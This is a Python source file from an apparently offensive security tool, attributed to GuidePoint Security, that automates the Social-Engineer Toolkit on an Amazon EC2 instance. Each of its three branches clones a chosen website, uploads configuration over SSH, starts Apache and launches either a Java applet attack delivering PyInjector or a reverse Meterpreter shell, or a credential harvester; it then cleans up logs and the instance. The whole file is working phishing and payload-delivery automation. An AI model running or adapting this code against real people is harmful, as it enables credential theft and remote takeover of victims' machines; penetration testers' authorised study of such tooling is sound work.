#!/usr/bin/env python
# Defines the bulk of the SET Webattack and automation

import sys
import core.config
import core.lib.fabfunky as fabfunky
import core.lib.ec2funky as ec2funky
import core.autoset as autoset
import core.menus as menus
from fabric.colors import green, yellow, red
from core.set_conf import apache_conf
from time import sleep

__author__ = 'David Bressler (@bostonlink), GuidePoint Security LLC'
__copyright__ = 'Copyright 2013, GuidePoint Security LLC'
__credits__ = ['GuidePoint Security LLC']
__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'David Bressler (@bostonlink), GuidePoint Security LLC'
__email__ = 'david.bressler@guidepointsecurity.com'
__status__ = 'Development'

def set_web_attacks(idic):

	# Parse the config file and unpack user options from autoset menu
	config = core.config.get_config()
	java_app_pyi, java_app, charvest = menus.autoset_menu()
	
	if java_app_pyi == True:

		web_clone = menus.autoset_file_menu()
		print green("\nCreating custom SET automation file...")
		autofile = autoset.java_app_pyinject(idic["ip"], web_clone)
		print green("Custom SET automation file created.\n")

		# Attempts to establish an SSH conection to the instance
		while True:
			try:
				sleep(2)
				print yellow("Attempting to establish a connection to %s" % idic["ip"])
				fabfunky.conn_est(idic["ip"], config["instance_user"])
				break
			except Exception:
				print red("Instance is still initializing...")
				pass

		# Check apache status within local config file and if set to ON uploads the local config
		apache_status = apache_conf(config["set_config"])
		
		if apache_status == 'ON':

			rfile = '/home/%s/set_config' % config['instance_user']

			#uploads local SET config file
			fabfunky.file_upload(idic["ip"], config["instance_user"], config["set_config"], rfile)
			fabfunky.move(idic["ip"], config["instance_user"], rfile, "/usr/share/set/config/")
			
			print green("\nStarting Apache....")
			fabfunky.apache_start(idic["ip"], config["instance_user"])
			print green("Apache Started...")

		else:
			pass

		# Checks to see if the user wants an interactive shell or connect via ssh manually
		interactive = menus.inter_shell_menu()

		if interactive == False:

			print green("\nLaunching SET...")
			fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)
			print green("\nSET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]

		elif interactive == True:

			print green("\nLaunching SET...")
			screen = fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)

			screen = screen.strip().split()
			sleep(2)
			if '.SET' in screen[5]:
				print screen[5]
				cmd = 'sudo screen -r %s' % screen[5]
				print red("\nDropping into a SSH shell....")
				print green("SET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]
				print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
				sleep(2)
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)
			else:
				cmd = None
				print red("\nDropping into a SSH shell....\n")
				print red("No screen session returned.")
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)

			# clean and terminate if attack is done
			cleanup = menus.cleanup_menu()

			if cleanup == True:

				conn = ec2funky.ec2connx(config["accesskey"], config["secretkey"])
				print red("Cleaning up %s - %s instance" % (idic["tags"], idic["iid"]))
				fabfunky.get_logz(idic["ip"], config["instance_user"])
				fabfunky.disconnect_all()
				ec2funky.terminate_instance(idic["iid"], conn)

			else:

				fabfunky.disconnect_all()
				print red("SSH: ssh -i %s.pem %s@%s") % (idic["key"], config["instance_user"],idic["ip"])
				print "Be sure to run 'python cloudPWNclean.py' after the attack to pull logs and terminate the instance."

	elif java_app == True:

		web_clone = menus.autoset_file_menu()
		print green("\nCreating custom SET automation file...")
		autofile = autoset.java_applet(idic["ip"], web_clone)
		print green("Custom SET automation file created.\n")

		while True:
			try:
				sleep(2)
				print yellow("Attempting to establish a connection to %s" % idic["ip"])
				fabfunky.conn_est(idic["ip"], config["instance_user"])
				break
			except Exception:
				print red("Instance is still initializing...")
				pass

		apache_status = apache_conf(config["set_config"])
		
		if apache_status == 'ON':

			rfile = '/home/%s/set_config' % config['instance_user']

			#uploads local SET config file
			fabfunky.file_upload(idic["ip"], config["instance_user"], config["set_config"], rfile)
			fabfunky.move(idic["ip"], config["instance_user"], rfile, "/usr/share/set/config/")
			
			print green("\nStarting Apache....")
			fabfunky.apache_start(idic["ip"], config["instance_user"])
			print green("Apache Started...")

		else:
			pass

		interactive = menus.inter_shell_menu()

		if interactive == False:

			print green("\nLaunching SET...")
			fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)
			print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]

		elif interactive == True:
			
			print green("\nLaunching SET...")
			screen = fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)
			print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]

			screen = screen.strip().split()
			sleep(2)
			if '.SET' in screen[5]:
				print screen[5]
				cmd = 'sudo screen -r %s' % screen[5]
				print red("\nDropping into a SSH shell....")
				print green("SET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]
				print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
				sleep(2)
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)
			else:
				cmd = None
				print red("\nDropping into a SSH shell....\n")
				print red("No screen session returned.")
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)

			# clean and terminate if attack is done
			cleanup = menus.cleanup_menu()

			if cleanup == True:

				conn = ec2funky.ec2connx(config["accesskey"], config["secretkey"])
				print red("Cleaning up %s - %s instance" % (idic["tags"], idic["iid"]))
				fabfunky.get_logz(idic["ip"], config["instance_user"])
				fabfunky.disconnect_all()
				ec2funky.terminate_instance(idic["iid"], conn)

			else:

				fabfunky.disconnect_all()
				print red("SSH: ssh -i %s.pem %s@%s") % (idic["key"], config["instance_user"],idic["ip"])
				print "Be sure to run 'python cloudPWNclean.py' after the attack to pull logs and terminate the instance."

	elif charvest == True:

		web_clone = menus.autoset_file_menu()
		print green("\nCreating custom SET automation file...")
		autofile = autoset.cred_harvest(idic["ip"], web_clone)
		print green("Custom SET automation file created.\n")

		while True:
			try:
				sleep(2)
				print yellow("Attempting to establish a connection to %s" % idic["ip"])
				fabfunky.conn_est(idic["ip"], config["instance_user"])
				break
			except Exception:
				print red("Instance is still initializing...")
				pass

		apache_status = apache_conf(config["set_config"])
		
		if apache_status == 'ON':

			rfile = '/home/%s/set_config' % config['instance_user']

			#uploads local SET config file
			fabfunky.file_upload(idic["ip"], config["instance_user"], config["set_config"], rfile)
			fabfunky.move(idic["ip"], config["instance_user"], rfile, "/usr/share/set/config/")
			print green("\nStarting Apache....")
			fabfunky.apache_start(idic["ip"], config["instance_user"])
			print green("Apache Started...")

		else:
			pass

		interactive = menus.inter_shell_menu()

		if interactive == False:

			print green("\nLaunching SET...")
			fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)
			print green("\nSET Launched Credential Harvester..... browse to http://%s to test") % idic["ip"]

		elif interactive == True:
			
			print green("\nLaunching SET...")
			screen = fabfunky.set_auto(idic["ip"], config["instance_user"], autofile)
			print green("\nSET Launched Credential Harvester..... browse to http://%s to test") % idic["ip"]

			screen = screen.strip().split()
			sleep(2)
			if '.SET' in screen[5]:
				print screen[5]
				cmd = 'sudo screen -r %s' % screen[5]
				print red("\nDropping into a SSH shell....")
				print green("SET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]
				print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
				sleep(2)
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)
			else:
				cmd = None
				print red("\nDropping into a SSH shell....\n")
				print red("No screen session returned.")
				fabfunky.interactive_shell(idic["ip"], config["instance_user"], cmd)

			# clean and terminate if attack is done
			cleanup = menus.cleanup_menu()

			if cleanup == True:

				conn = ec2funky.ec2connx(config["accesskey"], config["secretkey"])
				print red("Cleaning up %s - %s instance" % (idic["tags"], idic["iid"]))
				fabfunky.get_logz(idic["ip"], config["instance_user"])
				fabfunky.disconnect_all()
				ec2funky.terminate_instance(idic["iid"], conn)

			else:

				fabfunky.disconnect_all()
				print red("SSH: ssh -i %s.pem %s@%s") % (idic["key"], config["instance_user"],idic["ip"])
				print "Be sure to run 'python cloudPWNclean.py' after the attack to pull logs and terminate the instance."	